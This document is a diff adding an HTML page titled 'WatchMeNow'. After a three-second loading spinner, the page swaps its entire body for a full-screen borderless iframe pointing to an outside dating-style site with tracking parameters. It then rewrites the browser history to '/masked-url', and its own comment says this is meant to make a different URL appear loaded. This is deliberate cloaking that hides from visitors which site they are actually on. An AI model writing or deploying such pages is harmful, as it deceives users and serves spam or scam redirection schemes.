@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WatchMeNow</title>
+    <style>
+        /* Style for the loading logo or spinner */
+        #loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* Style to make the iframe fill the entire page */
+        iframe {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Loading logo or spinner -->
+<div id="loading">
+    <img src="Loading.gif" alt="Loading" width="50" height="50">
+    <p>Loading...</p>
+</div>
+
+<!-- The iframe element will be displayed after 3 seconds -->
+<script>
+    // Show loading logo
+    document.getElementById('loading').style.display = 'block';
+
+    // Delay for 3 seconds
+    setTimeout(function() {
+        // Hide loading logo
+        document.getElementById('loading').style.display = 'none';
+
+        // Display the iframe with 100% width and 100% height of the viewport
+        document.body.innerHTML = '<iframe src="https://lovepersonaldate.life/?u=rudktec&o=9kgp9mx" frameborder="0"></iframe>';
+
+        // Manipulate the browser history to make it seem like a different URL is loaded
+        window.history.replaceState({}, '', '/masked-url');
+    }, 3000);
+</script>
+
+</body>
+</html>
